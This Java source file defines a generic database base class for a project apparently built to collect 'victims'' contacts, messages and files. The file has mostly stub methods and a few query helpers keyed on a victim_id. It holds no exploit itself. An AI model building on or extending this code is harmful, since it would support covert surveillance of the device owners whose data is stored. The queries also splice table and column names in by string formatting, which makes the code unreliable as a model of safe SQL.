package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.NotNull;
import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Delivery;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.List;

/**
 * Created by theapache64 on 11/22/2015.
 */
public class BaseTable<T> {

    public static final String COLUMN_ID = "id";
    public static final String COLUMN_NAME = "name";
    public static final String COLUMN_CREATED_AT = "last_logged_at";
    protected static final String COLUMN_AS_UNIX_EPOCH = "unix_epoch";
    private static final String ERROR_MESSAGE_UNDEFINED_METHOD = "Undefined method.";
    private static final String COLUMN_AS_TOTAL_ROWS = "total_rows";

    public T get(final String column, final String value) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean add(@Nullable final String victimId, final JSONObject jsonObject) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public String addv3(T newInstance) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean add(T newInstance) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public void addv2(T newInstance) throws RuntimeException {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public String get(final String byColumn, final String byValues, final String columnToReturn) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public T get(final String column1, final String value1, final String column2, final String value2) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }


    public void addv2(@Nullable final String victimId, final JSONArray jsonArray) throws RuntimeException, JSONException {
        throw new RuntimeException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    protected List<T> parse(final String victimId, @NotNull JSONArray jsonArray) throws JSONException {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean update(T t) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    protected boolean update(String tableName, String whereColumn, String whereColumnValue, String columnToUpdate, String valueToUpdate) {

        boolean isEdited = false;
        final String query = String.format("UPDATE %s SET %s = ? WHERE %s = ?;", tableName, columnToUpdate, whereColumn);
        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, valueToUpdate);
            ps.setString(2, whereColumnValue);

            isEdited = ps.executeUpdate() == 1;
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return isEdited;
    }

    protected boolean isExist(final T t) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    protected boolean isExist(final String whereColumn, final String whereColumnValue) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean isExist(final String whereColumn1, final String whereColumnValue1, final String whereColumn2, final String whereColumnValue2) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public String getV2(String tableName, String byColumn, String byValue, String columnToReturn) {

        final String query = String.format("SELECT %s FROM %s WHERE %s = ? ORDER BY id DESC LIMIT 1", columnToReturn, tableName, byColumn);

        String resultValue = null;
        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, byValue);
            final ResultSet rs = ps.executeQuery();

            if (rs.first()) {
                resultValue = rs.getString(columnToReturn);
            }
            rs.close();
            ps.close();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return resultValue;
    }

    public boolean isExist(String tableName, String whereColumn1, String whereColumnValue1, String whereColumn2, String whereColumnValue2) {
        boolean isExist = false;
        final String query = String.format("SELECT id FROM %s WHERE %s = ? AND %s = ? LIMIT 1", tableName, whereColumn1, whereColumn2);
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, whereColumnValue1);
            ps.setString(2, whereColumnValue2);
            final ResultSet rs = ps.executeQuery();
            isExist = rs.first();
            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return isExist;
    }

    public static class Factory {
        public static BaseTable getTable(String deliveryType) {
            switch (deliveryType) {

                case Delivery.TYPE_CONTACTS:
                    return Contacts.getInstance();

                //Returning message table
                case Delivery.TYPE_MESSAGES:
                    return Messages.getInstance();

                case Delivery.TYPE_FILES:
                    return Files.getInstance();

                default:
                    throw new IllegalArgumentException("No table defined for the type " + deliveryType);
            }
        }
    }

    public List<T> getAll(final String whereColumn, final String whereColumnValue) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }


    protected int getTotal(final String tableName, final String victimId) {

        int totalCount = 0;
        final String query = String.format("SELECT COUNT(id) AS total_rows FROM %s  WHERE victim_id = ?", tableName);
        final java.sql.Connection con = Connection.getConnection();
        try {
            final PreparedStatement ps = con.prepareStatement(query);

            ps.setString(1, victimId);

            final ResultSet rs = ps.executeQuery();

            if (rs.first()) {
                totalCount = rs.getInt(COLUMN_AS_TOTAL_ROWS);
            }

            rs.close();
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return totalCount;
    }

    public int getTotal(final String victimId) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    protected static String[] getGroupDecatenated(String data) {
        if (data != null) {
            return data.split(",");
        }
        return null;
    }

}

